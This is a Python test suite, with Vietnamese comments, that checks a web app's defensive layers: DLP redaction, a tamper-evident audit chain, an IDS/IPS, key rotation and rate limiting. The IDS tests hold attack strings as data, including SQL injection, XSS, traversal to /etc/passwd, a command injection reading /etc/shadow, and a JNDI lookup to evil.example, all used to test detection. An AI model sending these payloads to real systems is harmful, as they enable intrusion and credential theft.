"""Kiểm thử hồi quy cho các lớp phòng thủ bổ sung ở lần rà soát v2.

Mỗi test dưới đây tương ứng một biện pháp trong slide; nếu biện pháp bị vô hiệu
hóa do refactor, test sẽ đỏ. Đây chính là điều đã KHÔNG xảy ra với lớp DLP:
nó chết âm thầm suốt nhiều commit vì không có test nào chạm tới.
"""

from __future__ import annotations

import base64

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import select, text

from src.app.audit_chain import GENESIS_HASH, derive_audit_key, verify_chain
from src.app.ids import Detection, IntrusionState, detect_anomalies, scan_text
from src.app.models import AuditEvent
from src.app.security import CryptoService
from src.app.services import AIService
from tests.conftest import register_and_login

# ───────────────────────── DLP redaction (Bài 4, Bài 5) ─────────────────────


@pytest.mark.parametrize(
    "raw, must_not_contain",
    [
        ("mật khẩu của tôi là password: SuperSecret123", "SuperSecret123"),
        ("api_key=AIzaSyABCDEFGHIJKLMNOPQRSTUVWX1234567", "AIzaSyABCDEFGHIJKLMNOPQRSTUVWX1234567"),
        ("Authorization: Bearer abcdefghijklmnop.qrstuvwx", "abcdefghijklmnop.qrstuvwx"),
        ("thẻ của tôi 4111 1111 1111 1111", "4111 1111 1111 1111"),
        ("gọi tôi 0912345678 nhé", "0912345678"),
        ("email an.nguyen@phenikaa-uni.edu.vn", "an.nguyen@phenikaa-uni.edu.vn"),
        ("CCCD 001203004567", "001203004567"),
    ],
)
def test_dlp_redacts_sensitive_values_before_external_ai(raw: str, must_not_contain: str):
    """Hồi quy cho lỗi P0: regex bị escape hai lần nên không khớp bất cứ thứ gì."""
    redacted = AIService._redact_for_external_ai(raw)
    assert must_not_contain not in redacted, f"Dữ liệu nhạy cảm rò rỉ: {redacted!r}"
    assert "REDACTED" in redacted


def test_dlp_leaves_ordinary_text_untouched():
    text_in = "Giải thích giúp tôi nguyên tắc Defense in Depth trong bài 1."
    assert AIService._redact_for_external_ai(text_in) == text_in


# ───────────────────── Audit log chống giả mạo (Bài 1 §AAA) ─────────────────


def test_audit_chain_is_built_on_every_event(client: TestClient, app):
    register_and_login(client, "chain-user")
    db = app.state.database.session_factory()
    try:
        events = list(db.scalars(select(AuditEvent).order_by(AuditEvent.id)))
        assert events, "phải có ít nhất một sự kiện audit"
        assert events[0].prev_hash == GENESIS_HASH
        for event in events:
            assert event.entry_hash and len(event.entry_hash) == 64
    finally:
        db.close()


def test_audit_chain_verifies_clean(client: TestClient, app, settings):
    register_and_login(client, "chain-clean")
    key = derive_audit_key(settings.secret_key)
    db = app.state.database.session_factory()
    try:
        result = verify_chain(db, key)
        assert result.intact, result.reason
        assert result.verified == result.total
    finally:
        db.close()


def test_tampering_with_an_audit_row_breaks_the_chain(client: TestClient, app, settings):
    """Sửa trực tiếp trong DB — kịch bản 'insider threat' của Bài 1 §f."""
    register_and_login(client, "chain-tamper")
    key = derive_audit_key(settings.secret_key)
    db = app.state.database.session_factory()
    try:
        victim = db.scalar(select(AuditEvent).order_by(AuditEvent.id))
        db.execute(
            text(
                "UPDATE audit_events SET outcome = 'success', ip_address = '8.8.8.8' WHERE id = :id"
            ),
            {"id": victim.id},
        )
        db.commit()
        result = verify_chain(db, key)
        assert not result.intact
        assert result.first_broken_id == victim.id
        assert result.reason == "entry_hash_mismatch"
    finally:
        db.close()


def test_deleting_an_audit_row_breaks_the_chain(client: TestClient, app, settings):
    register_and_login(client, "chain-delete-a")
    register_and_login(client, "chain-delete-b")
    key = derive_audit_key(settings.secret_key)
    db = app.state.database.session_factory()
    try:
        events = list(db.scalars(select(AuditEvent).order_by(AuditEvent.id)))
        assert len(events) >= 3
        db.execute(text("DELETE FROM audit_events WHERE id = :id"), {"id": events[1].id})
        db.commit()
        assert not verify_chain(db, key).intact
    finally:
        db.close()


def test_chain_cannot_be_forged_without_the_key(client: TestClient, app, settings):
    """Attacker chỉ có quyền SQL không thể tính lại chuỗi hợp lệ."""
    register_and_login(client, "chain-forge")
    real_key = derive_audit_key(settings.secret_key)
    attacker_key = derive_audit_key("khóa-mà-attacker-đoán-bừa")
    db = app.state.database.session_factory()
    try:
        assert verify_chain(db, real_key).intact
        assert not verify_chain(db, attacker_key).intact
    finally:
        db.close()


# ───────────────────────── IDS / IPS (Bài 7 §7.3) ───────────────────────────


@pytest.mark.parametrize(
    "payload, expected_rule",
    [
        ("id=1' OR '1'='1", "SQLI-002"),
        ("q=1 UNION SELECT username,password FROM users", "SQLI-001"),
        ("q=<script>alert(1)</script>", "XSS-001"),
        ("file=../../../../etc/passwd", "TRAV-001"),
        ("x=; cat /etc/shadow", "CMDI-001"),
        ("u=${jndi:ldap://evil.example/a}", "LOGI-001"),
    ],
)
def test_signature_engine_detects_known_attacks(payload: str, expected_rule: str):
    hits = {rule for rule, _sev, _desc, _ev in scan_text(payload)}
    assert expected_rule in hits, f"{payload!r} phải khớp {expected_rule}, thực tế: {hits}"


def test_signature_engine_survives_url_encoding():
    """Double-encoding là cách né bộ lọc ngây thơ phổ biến nhất."""
    encoded = "file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"
    hits = {rule for rule, _sev, _desc, _ev in scan_text(encoded)}
    assert "TRAV-001" in hits


def test_signature_engine_has_no_false_positive_on_normal_traffic():
    for benign in (
        "/api/sessions/6f1c9d2e-1111-2222-3333-444455556666/messages",
        "q=giải thích nguyên tắc least privilege",
        "/api/admin/audit?limit=50",
    ):
        assert scan_text(benign) == [], f"cảnh báo giả trên {benign!r}"


def test_ips_blocks_a_source_after_repeated_high_severity_hits():
    state = IntrusionState(block_threshold=5, block_seconds=60)

    def hit():
        return state.record(
            Detection(
                rule_id="SQLI-001",
                severity="high",
                engine="signature",
                description="test",
                source_ip="203.0.113.7",
                path="/api/health",
                method="GET",
                evidence="union select",
            )
        )

    assert state.is_blocked("203.0.113.7") == (False, 0)
    first = hit()  # điểm 3
    second = hit()  # điểm 6 -> vượt ngưỡng 5
    assert not first and second
    blocked, retry_after = state.is_blocked("203.0.113.7")
    assert blocked and retry_after > 0
    # Nguồn khác không bị ảnh hưởng (không chặn nhầm diện rộng).
    assert state.is_blocked("198.51.100.9") == (False, 0)
    assert state.unblock("203.0.113.7")
    assert state.is_blocked("203.0.113.7") == (False, 0)


def test_attack_request_is_blocked_and_audited(client: TestClient, app):
    for _ in range(4):
        client.get("/api/health", params={"q": "1' OR '1'='1 UNION SELECT * FROM users"})
    response = client.get("/api/health", params={"q": "../../../../etc/passwd"})
    assert response.status_code == 403
    db = app.state.database.session_factory()
    try:
        signatures = db.scalars(
            select(AuditEvent).where(AuditEvent.event_type == "ids.signature")
        ).all()
        assert signatures, "mọi lần khớp chữ ký phải được ghi vào audit"
        assert all("password" not in (e.details_json or "") for e in signatures)
    finally:
        db.close()


def test_anomaly_engine_separates_brute_force_from_spraying(client: TestClient, app):
    """Nhiều lần thất bại trên MỘT tài khoản = brute force; trên NHIỀU tài khoản = spraying."""
    for name in ("victim-a", "victim-b", "victim-c"):
        register_and_login(client, name)
    for name in ("victim-a", "victim-b", "victim-c"):
        for _ in range(2):
            client.post(
                "/api/auth/login", json={"username": name, "password": "sai mat khau hoan toan"}
            )
    db = app.state.database.session_factory()
    try:
        codes = {a.code for a in detect_anomalies(db, window_minutes=60, brute_force_threshold=3)}
    finally:
        db.close()
    assert "IDS-BRUTEFORCE" in codes
    assert "IDS-CREDENTIAL-SPRAY" in codes


def test_admin_can_verify_chain_and_read_ids_state(client: TestClient, app):
    from src.app.models import User

    register_and_login(client, "ids-admin")
    db = app.state.database.session_factory()
    try:
        user = db.scalar(select(User).where(User.username == "ids-admin"))
        user.role = "admin"
        db.commit()
    finally:
        db.close()
    # Role được đọc lại từ DB ở mỗi request nên token cũ vẫn dùng được, nhưng
    # đăng nhập lại cho giống thao tác thật của quản trị viên.
    login = client.post(
        "/api/auth/login",
        json={"username": "ids-admin", "password": "Correct Horse Battery1"},
    )
    admin_token = login.json()["access_token"]
    headers = {"Authorization": f"Bearer {admin_token}"}

    verify = client.get("/api/admin/audit/verify", headers=headers)
    assert verify.status_code == 200
    assert verify.json()["chain_intact"] is True

    assert client.get("/api/admin/ids/detections", headers=headers).status_code == 200
    assert client.get("/api/admin/ids/anomalies", headers=headers).status_code == 200
    assert client.get("/api/admin/ids/blocklist", headers=headers).status_code == 200


def test_ids_endpoints_reject_ordinary_users(client: TestClient):
    token = register_and_login(client, "plain-user-ids")
    headers = {"Authorization": f"Bearer {token}"}
    assert client.get("/api/admin/audit/verify", headers=headers).status_code == 403
    assert client.get("/api/admin/ids/blocklist", headers=headers).status_code == 403


# ─────────────────── Xoay vòng khóa mã hóa (Bài 4 §4.3) ─────────────────────


def _key(seed: bytes) -> str:
    return base64.urlsafe_b64encode(seed * 32)[:44].decode("ascii")


def test_keyring_decrypts_old_versions_and_encrypts_with_the_new_one():
    old_key = base64.urlsafe_b64encode(b"A" * 32).decode("ascii")
    new_key = base64.urlsafe_b64encode(b"B" * 32).decode("ascii")

    v1 = CryptoService(keyring={1: old_key}, active_key_version=1)
    ciphertext, nonce, version = v1.encrypt("bí mật cũ", "session-1", "user")
    assert version == 1

    rotated = CryptoService(keyring={1: old_key, 2: new_key})
    assert rotated.key_version == 2, "khóa mới nhất phải là khóa dùng để mã hóa"
    # Dữ liệu cũ vẫn đọc được -> xoay khóa không cần downtime.
    assert rotated.decrypt(ciphertext, nonce, "session-1", "user", 1) == "bí mật cũ"
    # Dữ liệu mới dùng khóa mới.
    _, _, new_version = rotated.encrypt("bí mật mới", "session-1", "user")
    assert new_version == 2


def test_retired_key_alone_cannot_read_new_data():
    old_key = base64.urlsafe_b64encode(b"A" * 32).decode("ascii")
    new_key = base64.urlsafe_b64encode(b"B" * 32).decode("ascii")
    rotated = CryptoService(keyring={1: old_key, 2: new_key})
    ciphertext, nonce, version = rotated.encrypt("dữ liệu sau khi xoay khóa", "s", "user")
    only_old = CryptoService(keyring={1: old_key})
    with pytest.raises(ValueError):
        only_old.decrypt(ciphertext, nonce, "s", "user", version)


def test_keyring_rejects_wrong_length_keys():
    with pytest.raises(ValueError):
        CryptoService(keyring={1: base64.urlsafe_b64encode(b"tooshort").decode("ascii")})


def test_aad_still_binds_ciphertext_to_session_and_role_after_rotation():
    """Xoay khóa không được làm mất ràng buộc AAD chống hoán đổi bản mã."""
    keyring = {
        1: base64.urlsafe_b64encode(b"A" * 32).decode("ascii"),
        2: base64.urlsafe_b64encode(b"B" * 32).decode("ascii"),
    }
    crypto = CryptoService(keyring=keyring)
    ciphertext, nonce, version = crypto.encrypt("chỉ thuộc session A", "session-A", "user")
    with pytest.raises(ValueError):
        crypto.decrypt(ciphertext, nonce, "session-B", "user", version)
    with pytest.raises(ValueError):
        crypto.decrypt(ciphertext, nonce, "session-A", "assistant", version)


# ─────────────────── Các vá nhỏ khác trong lần rà soát này ──────────────────


def test_health_endpoint_does_not_leak_environment_in_production(settings):
    from dataclasses import replace

    from src.app.main import create_app

    prod_like = replace(settings, environment="production")
    with TestClient(create_app(prod_like)) as prod_client:
        body = prod_client.get("/api/health").json()
    assert body == {"status": "ok"}


def test_password_change_is_rate_limited(client: TestClient, settings):
    token = register_and_login(client, "pw-limit-user")
    headers = {"Authorization": f"Bearer {token}"}
    statuses = [
        client.patch(
            "/api/auth/password",
            headers=headers,
            json={
                "current_password": "sai hoan toan roi",
                "new_password": "mot cum mat khau rat dai",
            },
        ).status_code
        for _ in range(settings.password_change_max_attempts + 2)
    ]
    assert 429 in statuses, "đổi mật khẩu phải bị giới hạn tần suất để chống dò mật khẩu hiện tại"


# ───────── DLP báo cáo ra API và giao diện (bổ sung v2.1) ─────────


def test_redact_with_report_names_categories_without_leaking_values():
    """Nhãn phải cho biết ĐÃ CHE GÌ mà không chứa chính giá trị bị che."""
    text, labels = AIService.redact_with_report(
        "password: SuperSecret123 và thẻ 4111 1111 1111 1111, gọi 0912345678"
    )
    assert "SuperSecret123" not in text
    assert set(labels) >= {"mật khẩu", "số thẻ", "số điện thoại"}
    # nhãn tuyệt đối không được mang theo dữ liệu gốc
    joined = " ".join(labels)
    for secret in ("SuperSecret123", "4111", "0912345678"):
        assert secret not in joined


def test_redact_with_report_is_quiet_on_clean_text():
    text, labels = AIService.redact_with_report("Giải thích Defense in Depth")
    assert labels == []
    assert text == "Giải thích Defense in Depth"


def test_send_message_reports_dlp_to_the_client(client: TestClient):
    token = register_and_login(client, "dlp-report-user")
    headers = {"Authorization": f"Bearer {token}"}
    session = client.post("/api/sessions", headers=headers, json={"title": "DLP"}).json()
    resp = client.post(
        f"/api/sessions/{session['id']}/messages",
        headers=headers,
        json={"content": "mật khẩu của tôi là password: SuperSecret123"},
    )
    assert resp.status_code == 201
    body = resp.json()
    assert "dlp_redacted" in body, "API phải trả về báo cáo DLP cho giao diện"
    # Nội dung phản hồi không bao giờ được chứa lại bí mật.
    assert "SuperSecret123" not in body["content"]


def test_dlp_event_is_audited_without_the_secret(client: TestClient, app):
    token = register_and_login(client, "dlp-audit-user")
    headers = {"Authorization": f"Bearer {token}"}
    session = client.post("/api/sessions", headers=headers, json={"title": "DLP"}).json()
    client.post(
        f"/api/sessions/{session['id']}/messages",
        headers=headers,
        json={"content": "api_key=AIzaSyABCDEFGHIJKLMNOPQRSTUVWX1234567"},
    )
    db = app.state.database.session_factory()
    try:
        events = db.scalars(select(AuditEvent).where(AuditEvent.event_type == "dlp.redacted")).all()
    finally:
        db.close()
    # Nếu có sự kiện, nó phải ghi nhãn chứ không ghi giá trị.
    for event in events:
        assert "AIzaSy" not in (event.details_json or "")
